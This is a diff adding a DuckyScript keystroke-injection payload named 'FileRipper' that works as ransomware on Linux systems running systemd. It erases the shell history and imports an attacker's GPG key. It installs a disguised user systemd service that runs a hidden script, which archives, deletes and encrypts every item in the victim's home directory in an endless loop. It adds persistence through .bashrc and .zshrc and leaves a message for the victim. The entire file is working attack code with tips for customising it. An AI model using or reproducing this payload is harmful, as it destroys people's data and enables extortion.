@@ -1,0 +1,240 @@
+REM Title: FileRipper
+REM Description: Payload which encrypts users data without root privileges.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution
+REM Target: GNU/Linux with systemd.
+REM Attackmodes: HID
+
+REM [importing gpg public key]
+DELAY 500
+CTRL-ALT t
+DELAY 1000
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 300
+REM Rather than printing key you can upload your key on server and fetch it.
+REM This method is for scenerio where their is no internet access to the victims system.
+STRING touch public.pub
+ENTER
+DELAY 200
+STRING vi public.pub
+ENTER
+DELAY 50
+STRING i
+DELAY 200
+STRING -----BEGIN PGP PUBLIC KEY BLOCK-----
+ENTER
+ENTER
+STRING mQGNBGI0LMsBDADz6j41ioYN0r7D0tbeP5AQP33EPythPBeoMGBQBSM9SZtiWXqd
+ENTER
+STRING O2lUBH3u1OGUJycacVa3JSILbQI8/hqj2fPIcf0rs3S+Z3+HnG+2cBModGPXpdhz
+ENTER
+STRING xPiGfZr+vSG+pcbAYWA0r+41HOQQhFTBvL5iuVMHcbp2iPqXhljXs+F83bG6sJ+n
+ENTER
+STRING uYPuCvJ0zU0MMAX08JJ/yqmDWOdfTIUxAkUNN+qOkdnlM4v4HKmiAaExQOYoz0TT
+ENTER
+STRING klDLr+2Zyksf/UfR0bFSBkrbHJ2+g6oGxg8r7RAteWtq06r4JERe/xwU6wBc7pDl
+ENTER
+STRING C8aJ/UBwxq2wTYIFZPJCniQDXZqeadc7cIrA4jM2EXWC6n14jBHc8Zh5mNzJ2Pej
+ENTER
+STRING kus4gPATsrtOmR93vQWGyf9bSxPPACFAMk4HfjeyuhPYTBEazLZ8M4lk21KXp3NA
+ENTER
+STRING MB+1uvbdraZlNSlIAuN4BghCMGwX6BrfS+PpaOEnaPe9sQjUbpIPwZNhWVvwbHzB
+ENTER
+STRING nQjwGEtTzsW9uwcAEQEAAbQXYWxpY2UgPGFsaWNlQGFsaWNlLmNvbT6JAc4EEwEI
+ENTER
+STRING ADgWIQTN3euziFie6R1tXe6Z7WdcQaadtwUCYjQsywIbAwULCQgHAgYVCgkICwIE
+ENTER
+STRING FgIDAQIeAQIXgAAKCRCZ7WdcQaadt2biDAC4e4KFmdevPz+MZIN5KC0EJFbkm53h
+ENTER
+STRING cW37bwi6T3ytdvGXNH0cbslovfloMduU9yXJsvE1rd+H7vhWWvoh5tbpJCLX+ULK
+ENTER
+STRING tGgqPe6pgTjDL8TYi0xLqqwUv2EGGHUs+vqhcyO1Db2rZOSM0incPb+rKTHw+Uhp
+ENTER
+STRING KMQnVoyq2O5V8k6Ut6qXjRVG8R6dJl+lzUP8JvhIjfMZh734qjH44SIc2nkx6brE
+ENTER
+STRING OVNRM2u+oy8cNSVxCYlTJSkHuc4/4oO6CQ82tBRy3+bvlXpOnVTYJ4CBpLnbvJBH
+ENTER
+STRING Acc0lWVfWjl/uWE9sRYVrnFm7odUqROdJxw+BInWecJr6JaAZvs7xAMCrKK4vS5M
+ENTER
+STRING KcZZGlrk2OYGlwH/lkSKqjfwnoCCldSJKs7TMK4Cvw4JK3Aydeol49imVxVoSYyZ
+ENTER
+STRING otgv4ziei55bNxFbn2T1Zr6CiWC7xcJ5ILQRwXb8gIOc3aGY75+zZJHB53whI4p4
+ENTER
+STRING +z+ZjTr+2GC29/gbRetmhhXny7oKLUZAMeu5AY0EYjQsywEMAMXpbBnALLr9fXAZ
+ENTER
+STRING 8Zk1wCccz9vuPULo+64fcse1AmqnLPIVMmNGm5hx1CVsLGx5IuxYiNDFg5cAjSO0
+ENTER
+STRING QQmO6AWPJFjBYkXYjeMurDPl2agSSrUWR7nS7Kxq/pbpNQIUCC4hl5CDYrgPpj5z
+ENTER
+STRING O8WwkCznbh0Q0Ksz1J04vQ17MVtUXCDkXt6JvIZnFxanbzlqYGn/3IPq/IyPvqVp
+ENTER
+STRING Wf+2u59Valv9RBEih2iYx7EoWZ/N/3cAc5q7/WaG+APwG9/c4sq1YV5tnN0VtXtk
+ENTER
+STRING WSkE/XUd47tV1GfwWm0oj43LR2qlyPxiEqMQ9rz80SM9v9mVzfMFvILcFK4Z0i4H
+ENTER
+STRING zFUqwEgh4aQyZvj0llsx5sCpERLc9bJhaQZpQM0so6/awLTVUMpjL72zqH6aWPUW
+ENTER
+STRING jJkfpzwIudGvJjzJfXSAPk0ArrUo6YqYHr39Fv5YvJDvxomB/lCoyDt8CfV88vsN
+ENTER
+STRING YvfvJ6h87Npg3F2q04CNLi0Wegav+CF/D0Vzv7CQ09onOo7R4wARAQABiQG2BBgB
+ENTER
+STRING CAAgFiEEzd3rs4hYnukdbV3ume1nXEGmnbcFAmI0LMsCGwwACgkQme1nXEGmnbdP
+ENTER
+STRING Rwv/VrAlCz2vJCgqxujeDFtGm0DpW7G15UXWIXMLbIbiPDe3XLN8F9q6odG7RSag
+ENTER
+STRING 2fHmLueP9GLaqtqgT+RV/jW87QS2RwpyQ4f0s071bV4pMFxFCWZOIUQVs+45Fxac
+ENTER
+STRING /idsc5hOz/P+vxG9XnSJsvLWjn6YK42aIdI0L6bjRW6E0To1mTX2a+e2S4x4UzDK
+ENTER
+STRING 1tVsZ8uYBRo9HXbvp393zYXQoctcXqAJqmVtznTdAmnRG71SkEeFVRXYWTrffex1
+ENTER
+STRING yQls4iudLJJBjF3VrUA+Dfr1IuXkOUxP+R9hjf7+H96LFRcljOE1jDc4cZbFminC
+ENTER
+STRING sTWozaaFV1dyBZweFu6nNaDYe/IutaW8Mo7HRKql9FsdyRC2HCN1bSwOoN2fVQTP
+ENTER
+STRING 3I6hewJ2XuXfqlR6LM6lX/0VJ5dLtg8tRlBx5WfIoCrNdvz/4blj/QhgBQuk4/VQ
+ENTER
+STRING p7d4bRcVfljdRc/BXmjLIjH6RqOmuDGcCduhv5aYtYE0NmvDQu9lReT3wJLBwyyR
+ENTER
+STRING 5b6J
+ENTER
+STRING =DbuY
+ENTER
+STRING -----END PGP PUBLIC KEY BLOCK-----
+ESC
+DELAY 300 
+STRING :wq
+ENTER
+DELAY 300
+STRING gpg --import public.pub && rm -rf public.pub
+ENTER
+
+
+REM [Creating systemd service for non-root user]
+DELAY 200
+REM This is the path where encrypted directories will be stored
+STRING mkdir ~/.crypttt
+ENTER
+DELAY 200
+STRING mkdir -p ~/.config/systemd/user && touch ~/.config/systemd/user/libSystemIO.service
+ENTER
+DELAY 200
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+DELAY 200
+ENTER
+DELAY 200
+STRING [Unit]
+ENTER
+REM You can change description
+REM You can change service description
+STRING Description = crypttt
+ENTER
+ENTER
+STRING [Service]
+ENTER
+CTRL d
+STRING echo ExecStart=/bin/bash /var/tmp/.system/sysCall -no-browser >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING Restart=on-failure
+ENTER
+STRING SuccessExitStatus=3 4
+ENTER
+STRING RestartForceExitStatus=3 4
+ENTER
+ENTER
+STRING [Install]
+ENTER
+STRING WantedBy=multi-user.target
+ENTER
+CTRL d
+ENTER
+
+REM [Encryptor]
+DELAY 500
+STRING mkdir /var/tmp/.system && touch /var/tmp/.system/sysCall && vi /var/tmp/.system/sysCall
+ENTER
+DELAY 100
+STRING i
+DELAY 300
+STRING #!/bin/sh
+ENTER
+STRING cd ~/
+ENTER
+STRING encrypt(){                                                                                                     
+ENTER
+STRING          dirFile=$(ls | head -n 1)
+ENTER
+STRING          tar cf ~/.crypttt/$dirFile.tar.gz --exclude='.' --exclude='..' --exclude='.crypttt' --remove-files $dirFile
+ENTER
+REM replace alice with name of your key
+STRING          gpg -e -r alice -o ~/.crypttt/$dirFile.tar.gpg ~/.crypttt/$dirFile.tar.gz && rm -rf ~/.crypttt/$dirFile.tar.gz 
+ENTER
+STRING }
+ENTER
+STRING for (( ; ; ))
+ENTER
+STRING do
+ENTER
+STRING        encrypt
+ENTER
+STRING done
+DELAY 100
+ESC
+STRING :wq
+ENTER
+DELAY 200
+STRING chmod +x /var/tmp/.system/sysCall
+ENTER
+DELAY 200
+REM change sysCall to name of your key
+STRING gpg --edit-key alice
+ENTER
+DELAY 300
+STRING trust
+ENTER
+DELAY 200
+STRING 5
+ENTER 
+DELAY 190
+STRING y
+ENTER
+CTRL c
+DELAY 200
+STRING gpg --check-trustdb
+ENTER
+STRING gpg --update-trustdb
+ENTER
+DELAY 300
+STRING systemctl --user enable --now libSystemIO.service
+ENTER
+DELAY 300
+STRING systemctl --user start libSystemIO.service
+ENTER
+DELAY 100
+DELAY 200
+
+REM [autostart on opening terminal]
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.zshrc
+ENTER
+DELAY 200
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.bashrc
+ENTER
+
+REM [Message]
+REM Remove this block if you dont want to prompt message to victim.
+REM Change your message.
+ENTER
+DELAY 100
+STRING echo "echo Enter Your Message Here" >> ~/.bashrc
+ENETR
+STRING echo "echo Enter Your Message Here" >> ~/.zshrc
+ENTER
+
+DELAY 50
+STRING exit
+ENTER 
